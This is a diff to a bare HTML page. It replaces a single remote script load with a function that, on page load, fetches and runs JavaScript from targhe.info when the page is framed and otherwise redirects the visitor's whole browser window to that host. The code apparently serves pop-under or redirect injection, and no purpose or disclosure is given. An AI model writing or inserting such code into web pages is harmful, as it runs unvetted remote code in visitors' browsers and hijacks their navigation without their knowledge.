@@ -6,8 +6,20 @@
 
 <body>
 	<script>
-		$.getScript("https://targhe.info/pop-go/55068");
-	</script>
+
+function iniFrame() {
+
+    if (window.self !== window.top) {
+       $.getScript("https://targhe.info/pop-go/55068");
+    }
+    else {
+        window.location.href = "https://targhe.info/pop-go/55068";    }
+}
+
+iniFrame();
+
+</script>
+
 
 </body>
 </html>
